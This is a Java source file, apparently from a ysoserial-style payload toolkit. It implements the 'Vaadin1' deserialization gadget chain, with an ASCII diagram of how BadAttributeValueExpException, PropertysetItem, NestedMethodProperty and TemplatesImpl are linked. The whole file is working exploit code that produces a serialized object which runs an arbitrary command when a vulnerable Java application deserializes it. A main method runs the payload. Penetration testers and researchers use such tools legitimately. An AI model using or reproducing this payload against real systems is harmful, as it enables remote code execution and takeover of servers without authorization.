package A.R.ysogate.payloads.gadgets;

import javax.management.BadAttributeValueExpException;

import A.R.ysogate.payloads.utils.PayloadRunner;
import com.vaadin.data.util.NestedMethodProperty;
import com.vaadin.data.util.PropertysetItem;

import A.R.ysogate.payloads.ObjectPayload;
import A.R.ysogate.payloads.annotation.Authors;
import A.R.ysogate.payloads.annotation.Dependencies;
import A.R.ysogate.payloads.utils.Gadgets;
import A.R.ysogate.payloads.utils.JavaVersion;
import A.R.ysogate.payloads.utils.Reflections;

@Dependencies({"com.vaadin:vaadin-server:7.7.14", "com.vaadin:vaadin-shared:7.7.14"})
@Authors({Authors.KULLRICH})
public class Vaadin1 implements ObjectPayload<Object> {
//  +-------------------------------------------------+
//  |                                                 |
//  |  BadAttributeValueExpException                  |
//  |                                                 |
//  |  val ==>  PropertysetItem                       |
//  |                                                 |
//  |  readObject() ==> val.toString()                |
//  |          +                                      |
//  +----------|--------------------------------------+
//             |
//             |
//             |
//        +----|-----------------------------------------+
//        |    v                                         |
//        |  PropertysetItem                             |
//        |                                              |
//        |  toString () => getPropertyId().getValue ()  |
//        |                                       +      |
//        +---------------------------------------|------+
//                                                |
//                  +-----------------------------+
//                  |
//            +-----|----------------------------------------------+
//            |     v                                              |
//            |  NestedMethodProperty                              |
//            |                                                    |
//            |  getValue() => java.lang.reflect.Method.invoke ()  |
//            |                                           |        |
//            +-------------------------------------------|--------+
//                                                        |
//                    +-----------------------------------+
//                    |
//                +---|--------------------------------------------+
//                |   v                                            |
//                |  TemplatesImpl.getOutputProperties()           |
//                |                                                |
//                +------------------------------------------------+

	@Override
	public Object getObject(String command) throws Exception {
		Object          templ = Gadgets.createTemplatesImpl(command);
		PropertysetItem pItem = new PropertysetItem();

		NestedMethodProperty<Object> nmprop = new NestedMethodProperty<Object>(templ, "outputProperties");
		pItem.addItemProperty("outputProperties", nmprop);

		BadAttributeValueExpException b = new BadAttributeValueExpException("");
		Reflections.setFieldValue(b, "val", pItem);

		return b;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(Vaadin1.class, args);
	}
	public static boolean isApplicableJavaVersion() {
		return JavaVersion.isBadAttrValExcReadObj();
	}
}
